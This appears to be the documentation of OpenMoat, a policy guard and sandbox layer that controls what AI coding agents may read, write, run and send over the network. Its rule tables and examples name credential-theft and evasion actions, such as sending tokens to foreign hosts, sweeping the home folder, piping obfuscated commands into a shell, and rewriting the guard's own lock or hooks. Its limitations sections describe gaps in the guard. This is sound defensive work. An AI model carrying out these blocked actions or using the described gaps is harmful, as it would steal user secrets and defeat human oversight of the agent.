| deny | `kernel-self` | reads of OpenMoat's state beside the policy: `~/.moat/audit.db*`, `policy.lock`, `hosts.json`, `approvals.json`, `trust.json`, `allowed_signers` and `mcp/` (and `audit.db*` and `policy.lock` in any `.moat/`), while `~/.moat/policy.yaml` stays readable; writes to `~/.moat`, `~/.codex`, anything under a `.moat/` directory, host hook/settings files, and to the directories `~/.moat`, `~/.claude`, `~/.codex`, `~/.cursor` (and `.moat`, `.claude`, `.codex`, `.cursor` anywhere) themselves, and the same paths in the directories `MOAT_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME` and `CURSOR_CONFIG_DIR` name (§3.2), so they cannot be renamed, deleted or replaced by a link; OpenClaw's state directory `~/.openclaw` itself, its configuration `~/.openclaw/openclaw.json`, the plugin `moat init` writes (`~/.openclaw/openmoat` and `~/.openclaw/openmoat/**`) and its state database `~/.openclaw/state/**`; any `bin/moat` or `bin/moat.exe` (the binary every hook runs), and Scoop's `apps/moat/current` junction and `apps/moat/<version>/moat.exe` (ADR-016); `moat policy/init/doctor/allow/edit/secret/trust/uninstall`, `moat sandbox sync` and `moat audit anchor` from an agent, also by absolute path (`*/moat …`) and under the pseudo-terminal wrappers `script`, `expect`, `unbuffer` (ADR-011), also by absolute path, Python `pty.spawn(…)`, `tmux`/`screen` and `osascript` (ADR-014); under those wrappers any `moat` command, a bare `moat` included, since its home screen asks questions at a terminal |
| deny | `shell-rc` | writes to `~/.zshrc`, `~/.bashrc`, `~/.profile` and friends |
| deny | `cloud-metadata` | network to instance metadata and link-local services (`169.254.*`, `fe80:*`, `fd00:ec2::254`, `100.100.100.200`, `metadata.google.internal`, `metadata.goog`), for shell network and for a host fetch tool alike |
| deny | `token-egress` | a token of a well-known prefixed format sent to a host that is not its service's, allowed hosts included: GitHub (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`, `github_pat_`; own hosts `github.com`, `githubusercontent.com`, `ghcr.io`), OpenAI and Anthropic (`sk-`, `sk-proj-`, `sk-ant-`, `sk-svcacct-`, `sk-admin-`; `openai.com`, `anthropic.com`), AWS access key ids (`AKIA…`; `amazonaws.com`, `aws.amazon.com`), Slack (`xoxa-`, `xoxb-`, `xoxp-`, `xoxr-`, `xoxs-`; `slack.com`), Google API keys (`AIza…`; `googleapis.com`, `google.com`), npm (`npm_`; `npmjs.org`, `npmjs.com`) and GitLab (`glpat-`; `gitlab.com`), each with its subdomains. Checked in a fetch or network tool's URL, an MCP URL argument, a web search query, and the arguments of a command that connects to a host (the `curl`, `wget`, `nc`, `ssh` family, `git clone/fetch/pull/push/ls-remote`) and of every command piped into one; the destination is every host those arguments name, `--connect-to`/`--resolve` targets and `Host:` headers included, and a destination that cannot be read counts as another host. The atom is `@token-egress <service> <host>`; the token is never in it. Only prefixed formats, the same list audit redaction masks: a commit SHA, a UUID or a base64 blob is never a token. A self-hosted GitLab or GitHub Enterprise server is not the service's host: to send tokens there, narrow the group (`shell: ["@token-egress github *", …]` without that service) |
| deny | `placeholder-egress` | a brokered secret's placeholder sent anywhere but that secret's `host` (§2.1), in the same places as `token-egress`; the atom is `@placeholder-egress <id> <host>` |
| allow | `agent-temp` | reading Claude Code's own temporary folder (`/tmp/claude-*/`, `/private/tmp/claude-*/`), where it keeps the output of background commands; `secrets-paths` still denies a `.env` or key there |
| allow | `project-fs` | read anywhere in `${project}`, including the root itself (a search with no path); write anywhere except `.moat/`, a `.git` at any depth (the root's, a nested repository's, a `gitdir:` file) and the files `runs-later` asks for |
| allow | `dev-shell` | `git status/diff/log/show/branch/add/commit/checkout/switch/fetch/pull/rebase/stash/merge`; `git restore` (each path is an `fs.write`, so `.git`, `.moat` and hook settings ask or are denied; not `.`, `./`, `*`, a `:` pathspec such as `:/`, or `--pathspec-from-file`, which restore the whole tree); the read-only `git ls-files/ls-tree/rev-parse/rev-list/merge-base/cat-file/blame/grep/describe/shortlog/check-ignore`, `git worktree list`, `git reflog` and `git reflog show`, listing tags (`git tag` alone, `-l`/`--list`, `--contains`, `--merged`, `--points-at`, `-n`), `git remote` alone or with `-v`, `git remote get-url`, and reading config (`git config --get/--get-all/--get-regexp/--list/-l`, `git config get/list`) when the read action comes first, after at most one scope option (`--global`, `--show-origin`, …) or `-f <file>`: git takes options only before the first name, so `git config core.pager '--get…'` is a write and asks; a config name (`user.name`) is never a host; `ls`, `cat`, `head`, `tail`, `grep`, `rg`, `find`, `pwd`, `echo`, `which`, `printf` (not `printf -v`, which assigns a variable), `command -v`/`-V` and `type` (they print how a name resolves and run nothing), `true`, `jq`; `cd`, `pushd`, `popd`, `mkdir`, `touch`, `cp`, `mv`, `rm` (their path operands are fs actions resolved through `cd` and symlinks, so outside `${project}` they defer, ask or meet a deny); `npm test/run`, `pnpm test/run/build/lint/typecheck/exec`, `yarn test/run/build/lint/exec`, `cargo build/test/check/clippy/fmt/run/doc/bench/nextest/tree/metadata`, `go test/build/vet`, `swift test/build`, `pytest`, `python -m pytest`, `python3 -m pytest`, `python -m venv`, `python3 -m venv` (each directory operand is an `fs.write`), sourcing the project venv's activate script spelled exactly `.venv/bin/activate` or `venv/bin/activate` (`source` or `.`, no arguments; the script is an `fs.read`, so one outside `${project}` defers), `make` with no arguments, `make test/build/check/lint`; other ecosystems' build and test commands, which run the project's own code like `cargo test`: `mvn test/compile/package/verify` (not with a `plugin:goal` such as `exec:exec`), `./gradlew` or `gradle test/build/check`, `dotnet build/test/run` (not with an msbuild `-switch:value` such as `-logger:`, or an `@file`), `bundle exec rspec`, `rspec`, `rake test` (not `-e`/`-p`/`--execute*`, which run Ruby given on the line, or `-g`/`--system`), `php artisan test`, `phpunit`, `cmake -B`/`-S` and `cmake --build` (not `-E`/`-P` or arguments after `--`), `ctest` (not dashboard submission `-D/-M/-T`, scripts `-S` or `--build-and-test`), `terraform fmt/validate` (`plan`, `apply` and `init` defer), `swift run`, `go run` of `.`, a `./` package or `.go` files (not `pkg@version`), a project script `python`/`python3 <file>.py` (also after up to two of `-I`, `-u`, `-B`, `-E`, `-s`, `-S`, `-O`, each a word of its own: `-Ic` runs code) or `node <file>.js/.mjs/.cjs` (the script is an `fs.read`, resolved through symlinks, so one outside `${project}` defers; `python -c` and `node -e` defer), `uv run <command>` (the command is classified on its own; not `--with`), `docker build` (not `--secret`, `--ssh`, `--build-context`, `--network`, `--allow`, `--security-opt`, `--output`/`-o`, `--push`, `--cache-to`, which `docker-secrets` asks for; `docker compose` defers). `npx <tool>` is not allowed, so it defers: it downloads a tool the project does not have, and the classifier cannot see `node_modules/.bin`. `exec` forms are allowed only because the wrapped program is evaluated on its own. Excluded (they defer, except the `git config` and `git remote` forms, which `git-internals` asks for): a recursive `rm` (`-r`, `-R`, `-rf`, …) of an operand that may name the project root or reach past it: `.`, `./`, an absolute or `~` path, a `$` variable, any `..`, or an unexpanded `*`, `./*`, `.*` (a recursive removal of a project subdirectory such as `rm -rf build` is allowed; `project-fs` leaves out `.git`, which `git-internals` asks for), `git merge -s`/`--strategy` (runs a `git-merge-<name>` program), `git checkout .`, `git checkout -- …` and forced checkouts (they discard uncommitted work), `find -exec/-ok/-delete/-fprint/-fls`, `rg --pre`, `git --upload-pack/--receive-pack`, `go -exec/-toolexec/-vettool`, `cargo --config`, `git grep -O`/`--open-files-in-pager` (runs a pager) and `--textconv`, `git cat-file --textconv/--filters` and `git blame --textconv` (run configured drivers), every other `git tag`, `git remote`, `git config`, `git reflog` and `git worktree` form (they create, delete, change config or contact the remote), `git rebase --exec/-x`, `--interactive/-i`, `--edit-todo`, `--continue`, `--skip` (they run or resume a todo list, which may hold `exec` lines) and `--strategy/-s` (runs a `git-merge-<name>` program), long options by any prefix git accepts, `venv --clear` (empties the directory) and `--upgrade`/`--upgrade-deps` |
| allow | `dev-readonly` | `wc`, `diff`, `tree`; `file`, `stat`, `du` (their operands are `fs.read`s); `fd` (not `-x`/`-X`/`--exec`/`--exec-batch`, which run a program per match); `file` not with `-C` (writes a compiled magic file) or `-f` (reads the names to check from a file); `uname`; `date` alone, with `+FORMAT` and/or `-u` (setting the clock defers); `brew list/ls/info/search/config/--version`; `java -version`/`--version` alone; a version query alone (`--version`, `-V`, `-v` or `version`) of a named toolchain (`git`, `node`, `npm`, `python3`, `cargo`, `rustc`, `go`, `docker`, `uv` and others; a program in the project defers), and a bare `git`; `docker ps/images/logs/version`; `gh pr view/list/diff/checks`, `gh issue view/list`, `gh run list/view`, `gh repo view` (not with `--output`/`-o`); reading `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LANG`, `TERM`, `TMPDIR`, `EDITOR` |
| allow | `shell-locals` | `env.set` of a lowercase shell variable (`for f in …`, `n=3`), except the proxy variables (`*_proxy`, `no_proxy`) and npm's `npm_config_*`, which programs read |
| allow | `dev-tools` | `tsc`, `eslint`, `prettier`, `biome`, `vitest`, `jest`, `mocha`, `ruff`, `black`, `mypy`, `golangci-lint`, `gofmt` (`gofmt -w` makes each operand an `fs.write`, and `-cpuprofile FILE` writes `FILE`, so outside the project these defer) |
| allow | `text-tools` | `sed`, `awk`, `sort`, `uniq`, `cut`, `tr`; their file operands and the files they write are fs actions, and what the classifier cannot prove read-only (`<program> @<argument>`, §3.1) is excluded, and `opaque-code` asks for it |
| allow | `registries` | `api.github.com`, `github.com`, npm, crates.io, Go proxy, PyPI (shell clients and `WebFetch` alike) |
| allow | `safe-mcp` | read-only GitHub and filesystem MCP tools |
| ask | `git-internals` | writes to a `.git` at any depth (hooks, config, refs, a `gitdir:` file) and `git config`, `git remote`, `git -c`, `git --config-env`, `git --git-dir`, `git --work-tree`, `git --exec-path` in the forms `dev-shell` does not allow: git runs what they name later, outside any sandbox |
| ask | `runs-later` | writes, at any depth, to what CI runs with the repository's secrets once a branch is pushed (`.github/workflows/`, `.gitlab-ci.yml`, `.circleci/`, `azure-pipelines.yml`, `Jenkinsfile`, `.buildkite/`) and to what runs on this machine outside any sandbox (`.husky/`, `.pre-commit-config.yaml`, `lefthook.yml`, `.lefthook.yml`, `.vscode/tasks.json`), including what an agent host starts in its next session (a project's `.claude/hooks/`, `.mcp.json`, `.cursor/mcp.json` and `.codex/config.toml`, and in the home `~/.claude.json`, `~/.claude/plugins/`, `~/.cursor/mcp.json` and `~/.cursor/cli-config.json`), and OpenClaw's plugin directories (`~/.openclaw/extensions/`, a project's `.openclaw/extensions/`). OpenClaw's state database (`~/.openclaw/state/`, which holds its exec approvals and the `cron` jobs its Gateway runs; an OpenClaw `cron` add or update is decided as a write of it) is `kernel-self`, so writes to it are denied. `project-fs` and `moat allow --dir` leave the project ones out, so the write asks; reading them stays allowed. Hook only: the OS sandboxes list them as writable, since a deny there would make them unreadable or fail installs that write them (`husky`) |
| ask | `persistence` | writes to `~/Library/LaunchAgents`, `~/.gitconfig`, `~/.config/git`, `~/.config/autostart`, `~/.config/systemd/user`; `crontab` |
| ask | `home-sweep` | reading the home folder or `~/.config` themselves, which is what a recursive read of them reads (`grep -r . ~`, `tar czf h.tgz ~`, `find ~ -name '*.pem'`) |
| ask | `secret-names` | a path through a variable whose value is not known (the `@unknown-path` atom, §3.1) whose file name is a key's, a token file's or a `.env` (`cat $X/id_rsa`, `cat "$d"/.env`); other such paths defer |
| ask | `other-home` | any path in another user's home (`~alice/.ssh/id_rsa`, the `@other-home` atom), which OpenMoat cannot place and which may hold that user's secrets |
| ask | `opaque-code` | `<program> @<argument>` atoms of `awk`, `sed`, `sort`, `uniq`, `cut` (a program or option the classifier cannot prove harmless, §3.1), `printf -v`, setting `CDPATH`, and `<shell> @stdin`: text piped into a shell that the command line does not show (`printf '\x63at .env' \| sh`) |
| ask | `package-near-miss` | installing a package whose name is not on the bundled list of popular names for its registry but is one typo or a common trick away from one that is (the `@package-near-miss` atom, §3.1): `pip install reqeusts`, `npm i lodahs`, `npm i react_dom`, `pip install python-requests`, `cargo add tokio-rs`. The reason names the popular package. A popular name, or one far from every popular name, is not asked about: unknown packages are normal, so those installs defer like any other |
| ask | `docker-secrets` | `docker build` with the options `dev-shell` leaves out (`--secret`, `--ssh`, `--build-context`, `--network`, `--output`, …) |
| defer | `local-net` | network to `localhost`, `127.0.0.1`, `::1`, fetches included: without it the `net` default would deny local services |
| defaults | `default`, `default.net`, `default.fetch`, `default.web.search`, `default.tool.unknown` | everything else defers to the agent's own permission prompt (installs, pushes and publishing included); outbound network to unlisted hosts is denied; a `WebFetch` of an unlisted URL defers (ADR-017); a `WebSearch` is allowed and recorded, and asks once the session read secret material; a tool the adapter cannot classify defers |

MCP calls are judged by name **and** by what their arguments touch: adapters map path-like arguments (`path`, `paths`, `file_path`, `source`, `destination`, …) to `fs.read`/`fs.write` atoms (write for `write_*`, `edit_*`, `move_*`, `delete_*`-shaped tools and for `destination`/`target`) and URL-like arguments (`url`, `uri`, `endpoint`) to `net` atoms, so `mcp__filesystem__read_file {path: ~/.aws/credentials}` is denied by `secrets-paths` even though `safe-mcp` allows the tool name. Arguments are searched down to 8 levels of nesting (`{"options": {"path": …}}`), URL arguments count with or without a scheme, and arguments that cannot be read (a Cursor `tool_input` string that is not JSON, more than 1024 paths and URLs) deny the call instead of letting the name decide alone. Arguments nested deeper than 8 levels are not searched; they may name a file or host, so the call is never `allow` (rule id `unparseable`, with the limit in the reason; §4 step 5: the default policy defers it), and a `deny` from what was searched still wins.

## 7. Recipes

Allow your company's package registry:
```yaml
allow:
  - id: company-registry
    net: ["npm.internal.example.com", "pypi.internal.example.com"]
```

Let the agent deploy with one script but nothing else in that directory:
```yaml
allow:
  - id: deploy-script
    shell: ["./scripts/deploy.sh *"]
deny:
  - id: deploy-dir
    fs.write: ["${project}/scripts/**"]
```

Make every `git push` require approval, even to `origin HEAD`:
```yaml
ask:
  - id: push
    shell: ["git push *"]
```

Check what a policy would do before installing it:
```bash
moat policy lint ./policy.yaml
moat policy check "npm install left-pad" --policy ./policy.yaml --project ~/code/app
moat policy check "~/.aws/credentials" --kind fs-read --policy ./policy.yaml
```

`policy lint` fails (exit 64) on errors: wrong version, unknown keys, missing or duplicate
ids, empty rules, bad globs or shell patterns, `executables` paths that are not absolute
(`/usr/bin/git` or `C:/…`). It prints warnings, and still exits 0, for rules that cannot
decide anything because an earlier list already matches everything they match: an `ask`
pattern covered by an `allow` pattern (allow is evaluated first, e.g. allow `cargo *` makes
ask `cargo publish*` unreachable), an `allow` pattern covered by a `deny` pattern (a `net`
pattern covers a `fetch` pattern, not the reverse), and
`defaults` keys that are not a known kind (`netw: deny` is silently ignored otherwise). The
check is conservative: a list with `!` exclusions is never assumed to cover anything, so no
warning does not prove a rule is reachable.

## 8. The policy lock

`moat init` records SHA-256 digests of the policy file and of every host hook file it
installed in `~/.moat/policy.lock`. `moat guard` recomputes them on every call; if any
pinned file changed or disappeared, every call is denied with rule `kernel-integrity`
until a person re-pins with `moat doctor --accept` (refused outside an interactive terminal) or
by re-running `moat init`. Edit the policy, then run `moat doctor --accept`. Which hook files are pinned is decided only by `moat init`: it keeps the ones already in the lock and adds those installed in the directories it records (its own `CLAUDE_CONFIG_DIR`, `CODEX_HOME` and `CURSOR_CONFIG_DIR`, else the recorded or default ones). `moat doctor --accept`, `moat allow` and `moat trust` re-pin exactly the files already in the lock, plus OpenMoat's own state files (`trust.json` once `moat trust` writes it), so running them from a shell where those variables differ from the agent's never drops the agent's hook file; `moat doctor` and `moat status` name a hook file installed under the current environment that the lock does not pin, and a pinned one outside it. A pinned file is identified by its location, so replacing it with a symlink, or re-pointing an existing link, counts as a modification even when the bytes read through it are unchanged. The same holds for a directory on its path: if `~/.claude` is moved and replaced by a link to a copy, `settings.json` resolves somewhere else and is reported as modified.

<a id="what-the-lock-is-not"></a>**What the lock is not.** The lock is a list of
SHA-256 digests in a file, with no key and no signature. It catches a change the agent
makes through its tools, and the agents' OS sandboxes stop the commands inside them
from changing `~/.moat` and the hook files at all (§9, [SANDBOX.md](SANDBOX.md)). It
does not stop a program that runs as the same user outside any sandbox: such a program
can change the policy and write new digests into the lock, and `moat guard` then finds
nothing wrong. In hook-only mode (OpenClaw, Claude Code and Cursor on native Windows,
or a sandbox that is off) every program an allowed command starts is such a program.
There the OS sandboxes (the agents' own sandboxes in the Standard tier, `moat run` and
`moat run --isolate`) are the protection; `moat status` shows which agents have one. A root user or a replaced `moat` binary is out of scope as well
(ADR-006, [THREAT_MODEL.md](THREAT_MODEL.md#5-known-limitations)).

One exception keeps a changed Claude Code toggle from stopping every agent. When the
only drift is in Claude Code's `settings.json`, limited to its own display and reply
settings (`language`, `outputStyle`, `spinnerVerbs`, `autoMode`, …), the model you
switch to (`model` and `switchModelsOnFlag`, which Claude Code writes itself) or its own
permission lists and modes (`permissions.allow`, `ask`, `deny`, `defaultMode`,
`additionalDirectories`, `blockReadsOutsideWorkingDirectories`), `moat guard` keeps
deciding every call by the policy. These settings change only when Claude Code asks
you; a hook deny stands whatever they say. The drift is recorded once per session
(rule `settings-drift`), and `moat doctor` and `moat status` keep reporting it until
you run `moat doctor --accept`. Removing a `permissions.deny` rule OpenMoat wrote, any
change under `hooks`, `env`, `apiKeyHelper`, `statusLine`, plugins, MCP servers or
`sandbox`, any key not on the list, and a file that no longer parses still deny every
call. Turning `blockReadsOutsideWorkingDirectories` off widens what sandboxed commands
may read; `moat status` then shows Claude Code as `hook only`. The full list and why
each key is safe are in `crates/openmoat-cli/src/integrity/relaxed.rs`. A lock written
before this release has no per-key record of `permissions`, so there a change to it
still denies until the next re-pin.

The lock also pins each MCP server definition the agents read (ADR-026): Claude Code's
`~/.claude.json` (`mcpServers` and each project's local `mcpServers`) and a project's
`.mcp.json`, Codex's `config.toml` and a project's `.codex/config.toml`, and Cursor's
`mcp.json` and a project's `.cursor/mcp.json`. Each entry is pinned by itself, by the
SHA-256 of its canonical JSON, not by its file, so the rest of `~/.claude.json` may change
freely. A definition that differs from its pin, or one added since, does not deny every
call. It denies that server's tool calls (`mcp__<server>__…`) with rule
`mcp-server-changed` until a person runs `moat mcp accept` or `moat doctor --accept`.
Both show what changed (never the value of an `env` variable or header) and ask. A file
that cannot be parsed holds back every MCP call of its agent. `moat init` pins what it
finds. The other re-pinning commands keep the MCP pins as they are.

`moat mcp proxy` (opt-in per server with `moat mcp wrap`) pins each tool's name,
description and input schema in `~/.moat/mcp/`. A tool with no pin, or one that changed,
is left out of `tools/list`, and a `tools/call` for it is answered with an error naming
`moat mcp accept <server>` (rule `mcp-tool-held` in the audit log, host `mcp-proxy`).
The first time the proxy sees a server, that is every tool it lists (ADR-032): `moat mcp
accept <server>` shows each one's name, description and input schema, asks, and pins
them. A server the proxy already pinned keeps its pins.

```yaml
mcp:
  trust_first_sight: false          # optional, default false: pin a new server's tools unseen
```

`trust_first_sight: true` has the proxy pin a new server's first listing as it is, as
releases before ADR-032 did. A server that is malicious from its first start then gets
its tool descriptions pinned as good, so `moat policy lint` warns while it is on. The
proxy honours it only while the policy lock is intact.

### 8.1 Executable pinning and the environment snapshot

`moat init` also records the search path and the absolute location of common programs
(`git`, `npm`, `node`, `python3`, `cargo`, `curl`, `ssh`, `sudo`, …) in
`~/.moat/environment.json`, pinned by the lock. For every shell command, the first word is
resolved through that snapshot, never through the environment the hook inherited. If the
program is pinned, either by `executables:` in the policy or by the snapshot, and it now
resolves somewhere else (a `git` planted in `node_modules/.bin`, an absolute path to a copy
in `/tmp`), the command is denied with rule `executables`. Unpinned programs are not checked.
After installing a tool in a new location, re-run `moat init` or `moat doctor --accept`.

On Windows the snapshot also records `PATHEXT`; a bare program name resolves as written, then with each recorded extension in order (default `.com`, `.exe`, `.bat`, `.cmd`).

`moat policy check` decides the way `guard` does: it resolves programs through the snapshot
when `~/.moat/environment.json` exists and resolves symlinks in checked paths. Without an
installation, installation pins are not consulted and a program pinned under `executables:`
is reported as "not found on the kernel search path" unless the command names it by
absolute path. Checked against the installed policy (no `--policy`), it also verifies
`policy.lock` first and, when a pinned file changed beyond the Claude Code settings
above, reports the `kernel-integrity` deny (exit 2) that `guard` answers instead of the
policy's verdict.

### 8.2 Approvals

When a host prompts you because the verdict was `ask`, you can make the answer stick:

```bash
moat allow --last                  # grant the most recent ask to that host session (exact command or files)
moat allow --last --always         # or add a permanent allow rule
moat allow "npm install left-pad" --host claude-code --session 7c1e
```

Session grants live in `~/.moat/approvals.json` and match the exact command text, or
the exact files and action (read or write) of a file ask, for one host session. File
paths are compared made absolute against the call's working directory, `~` expanded
and `.` and `..` collapsed. A grant applies to any `ask` for that command or those
files, including an `unparseable` one; it never overrides a `deny`. A file ask approved
with `--always` becomes an `fs.read` or `fs.write` rule for exactly its paths, as
asked and with symlinks resolved; a path with glob characters is refused. Hosts do not report when a session ends,
so a grant expires 24 hours after `moat allow` wrote it (granting the same command again
restarts it); `guard` ignores expired grants, every write of `approvals.json` drops them,
and `moat status` shows how many are active and the age of the oldest. A grant written
without a creation time (files from before grants expired) counts as expired.
Permanent rules (`--always`) never expire; they are appended to
`~/.moat/policy.d/approved.yaml` with ids `approved-1`, `approved-2`, … and a provenance
comment, and are merged into your policy at load time so `policy.yaml` is never rewritten.
The command is stored as a literal pattern: glob characters and `$` are escaped (`cat *` is
stored as `cat [*]` and approves only a literal `*`), and ids are numbered one past the
highest existing `approved-N`, so deleting a rule never causes a duplicate id. Shell rules
are prefixes, so a permanently approved `npm install left-pad` also allows extra arguments
after it; edit the overlay if you want it tighter. A permanently approved install of a
near-miss name (`npm i lodahs`, §3.1) also gets its `@package-near-miss npm lodahs lodash`
atom in the rule, so `package-near-miss` does not ask for that install again; another
near miss added to the same command still asks. Both files are pinned
by the lock; `moat allow` must be run from a terminal and is denied to agents.
`moat allow` verifies the lock before writing anything: if a pinned file (policy,
overlay, approvals, hook file) drifted, it lists each one and exits 64 without changing
the overlay, the grants or the lock. Review the changes with `moat doctor` and accept them
with `moat doctor --accept`, then approve again; approving a command never accepts drift.

```bash
moat allow --site docs.rs          # net: [docs.rs], network access to that host, fetches included
moat allow --dir ~/work/shared     # fs.read and fs.write of the directory and everything below it
moat allow --remove approved-3     # take a permanent rule out again
```

`--site` and `--dir` append a rule to the same overlay, check that the merged policy still
lints, re-pin, and print the rule as written plus the `--remove` command that undoes it.
`--site` takes a plain host name or address only (no wildcard, scheme or port; write those
with `moat edit`). `--dir` must name an existing directory; it is stored as written and,
when that differs, with its symlinks resolved, since the hook checks a path both ways. The
home directory, its ancestors and filesystem roots are refused, as are names with glob
characters. Deny rules still win, so `.env` files and keys inside an allowed directory stay
denied and `kernel-self` paths stay protected. `--remove` takes any `approved-N` id,
including one `--always` wrote.

`moat edit` opens `~/.moat/policy.yaml` in `$VISUAL`, `$EDITOR` or `vi` (`notepad` on
Windows) on a copy inside `~/.moat`. When the editor exits, an unchanged copy changes
nothing; a copy that does not lint (with the overlay merged, as `guard` loads it) is
reported and never written, and you can reopen it. Otherwise `moat edit` prints the lint
warnings and a unified diff and asks `Apply? [y/N]`; only `y` writes the policy, keeps the
previous one in `~/.moat/policy.yaml.bak` and re-pins. Like `moat allow` it needs a
terminal, refuses over a drifted lock, and is denied to agents by `kernel-self`.

`moat init` never replaces an existing policy, so a release whose default gained a rule
reaches an installed policy through `moat policy upgrade`. It merges the changes between
the default the policy was made from (`~/.moat/policy.base.yaml`, written with the policy)
and this release's default into the policy, line by line as `diff3` does: a change is
applied only where the policy still has the old default's lines, so a rule you changed or
removed stays as you left it, and a change next to or over your edit is listed instead of
applied. A policy made by 0.4.0 or earlier has no recorded base and is compared with the
0.3.0 default (0.1.1 to 0.3.0 installed it; the changes 0.4.0 made count as already
there); one that shares under half of its lines was
not made from a default, and nothing is offered. The upgraded policy must lint; the
command shows the diff, asks `[y/N]` (`--yes` skips the question, not the terminal), keeps
the previous policy in `~/.moat/policy.yaml.before-upgrade` and re-pins. `--undo` puts
that file back byte for byte; `--dry-run` only shows the changes and needs no terminal.

## 9. Host sandboxes (`sandbox:`)

`moat init` and `moat sandbox sync` compile the policy into each host's own sandbox
(Standard tier, ADR-018, ADR-019). The rules above apply there as an OS layer can apply
them: a deny rule denies; an allow rule allows; everything else, `ask` included, is
denied. Shell, `env.*`, `mcp` and `executables` rules have no OS form and stay with the
hook, as do the paths of a `hook_only` deny group (§2, ADR-034): OS layers treat those
paths as if the group were absent.

A deny-by-default read would also deny the toolchains and system files every command
reads, so the additive `sandbox.read_roots` key lists the paths sandboxed commands may
read although no allow rule covers them:

- Absolute or `~/…`, a directory or a file, never a glob, `.`/`..`, a filesystem root
  or the home directory itself (`policy lint` rejects them). Each root covers itself and
  everything below it. Missing paths are harmless.
- Only OS layers use the list. The hook keeps deciding these reads by the rules, so
  `cat ~/.cargo/registry/…` still defers under the default policy; deny rules win inside a root in every layer
  (`~/.cargo/credentials.toml` stays denied).
- This is the one way an OS layer is wider than the hook (ADR-019), and `moat sandbox
  show` prints it as an allowance. The default policy lists system directories
  (`/usr`, `/bin`, `/etc`, `/opt`, `/System`, `/Library`, `/nix`, …), temp directories
  and toolchain homes (`~/.cargo`, `~/.rustup`, `~/.npm`, `~/.nvm`, `~/.pyenv`,
  `~/.local/bin`, `~/go`, `~/.gitconfig`). A policy without a `sandbox:` section gets
  that list, and `sandbox show` says so.

**Network through `moat proxy` is opt-in.** By default each host's own proxy enforces
the `net` rules' domain names: Claude Code's `allowedDomains` with `strictAllowlist`,
and Codex's `network.domains`. Neither host's sandbox allows a direct connection.

Set the additive `sandbox.proxy_port` key (1–65535) to send sandboxed commands'
traffic through `moat proxy` (§5.2) on `127.0.0.1:<port>` instead. `moat proxy`
without `--listen` then uses that port, and the policy lock pins it with the rest of
the file.

`moat proxy` refuses a TLS tunnel whose `ClientHello` carries an encrypted server name
(ECH, extension `0xfe0d`, or the older ESNI, `0xffce`), rule `proxy-sni`: the server acts
on the encrypted inner name, so a site the policy does not allow could be reached
behind an allowed host on the same provider. Browsers send an ECH extension even
without an ECH key ("GREASE"), so a browser driven through the proxy is refused too.
`sandbox.proxy_allow_ech: true` forwards such tunnels (the cleartext name must still
match the CONNECT host), and `moat policy lint` warns about it. Without ECH an allowed
host can still front for another site through the HTTP `Host` header inside the
tunnel, which the proxy does not see.

| | What you gain | What it costs |
|---|---|---|
| `moat proxy` | Every connection is decided by the full policy (address patterns too, not only domain names) and recorded in the audit log. Brokered secrets (§2.1) are injected. Loopback, link-local, metadata and unnamed private addresses are refused after DNS. | `moat proxy` must be running. While it is stopped, Claude Code's sandboxed commands have no network (`npm install`, `cargo build` and `git fetch` fail), and `moat doctor` and `moat status` warn. Programs that speak only SOCKS5 have none at all. |

Keep the proxy running as a user service, for example a launchd agent or a systemd
user unit running `moat proxy`. `moat init` cannot install one yet (#272); routing
through `moat proxy` stays opt-in until it can.

Codex's own proxy still decides Codex's commands. It hands what it allows on to `moat
proxy` only when Codex starts with `HTTP_PROXY` and `HTTPS_PROXY` set to
`http://127.0.0.1:<port>`, and its API hosts then need an allow rule (THREAT_MODEL.md §5).

What each host enforces for sandboxed commands after `moat init` with the default
policy:

| | Claude Code (`Bash`, `PowerShell`, `Monitor`) | Codex (every command) |
|---|---|---|
| Read | project, read roots, paths outside the user directories; never `secrets-paths` | project, read roots, Codex's minimal system paths; never `secrets-paths` |
| Write | working directories, temp; never `secrets-paths`, `kernel-self`, `shell-rc`, `.moat`, or what in `.git` makes git run code (`hooks`, `config`, `config.worktree`, `info/attributes`, a worktree's `commondir`, the same in submodules) | project, temp; the same denies; `.git` read-only |
| Network | `registries` domains only (`strictAllowlist`); `cloud-metadata` denied; no direct connection. With `sandbox.proxy_port`: through `moat proxy` only | the same, through Codex's network proxy; with `sandbox.proxy_port`, on to `moat proxy` when Codex runs with `HTTP(S)_PROXY` |
| Escape hatches | `allowUnsandboxedCommands: false`, `failIfUnavailable: true`, no `excludedCommands` | `default_permissions = "moat"`; Codex asks before running outside the sandbox |

Losses (stricter than the policy): the `.env.example`, `.env.sample` and `.env.template`
exceptions cannot be re-allowed inside the `**/.env.*` deny; `.git` is read-only for
Codex's sandboxed commands; every `.moat` is denied under Claude Code, whose user
settings cannot name the project; Claude Code's file tools refuse reads outside the
working directories; with `sandbox.proxy_port`, Claude Code's sandboxed commands
have no network without `moat proxy` and none over SOCKS5. Allowances (wider): with
`sandbox.proxy_port`, Codex's traffic skips `moat proxy` unless Codex runs with
`HTTP(S)_PROXY`; the read roots, Codex `:minimal` and
`:tmpdir`, Claude Code's working directories, system paths, the directory-node
rules of `kernel-self` (`**/.claude` itself; the files below stay denied) and, so
that `git commit` works, writes to every `.git` under Claude Code except the paths
above (`claude-code.git-internals`), and a `.git` file or directory below the project
root under Codex (`codex.nested-git`: a Codex glob can only deny, which would also
block reading every `.git`); the hook still asks for file-tool writes to any `.git`. Run
`moat sandbox show` for the exact list your policy produces.

### 9.1 Package release age (`moat run`)

A malicious package version is usually found and taken down within days of its
release. `moat run` therefore tells the package managers the agent starts not to
install a version published in the last `sandbox.package_min_release_age_days`
days (ADR-030). The default is 7, also when the key is absent; `0` turns it off.

It sets two variables in the agent's environment, each a timestamp at the start of
the UTC day that many days back (`2026-10-11T00:00:00Z`); no configuration file is
written or changed:

| Variable | Tool | What the tool does |
|---|---|---|
| `npm_config_before` | npm (its `before` setting) | resolves each package to the newest version published before that time; a package with no such version fails to install |
| `UV_EXCLUDE_NEWER` | uv (`--exclude-newer`) | leaves out distributions uploaded after that time |

A cut-off the person set is kept: either variable already in `moat run`'s
environment (`NPM_CONFIG_BEFORE` too), a `before=` line in the project's `.npmrc`,
or `exclude-newer` in the project's `pyproject.toml` or `uv.toml`. A project with a
`uv.lock` gets no `UV_EXCLUDE_NEWER`: uv records the setting in its lockfile, so a
cut-off that moves every day would make uv resolve the lockfile again. pip, pnpm,
Yarn and Bun are not covered, and the host sandboxes of the Standard tier set nothing.
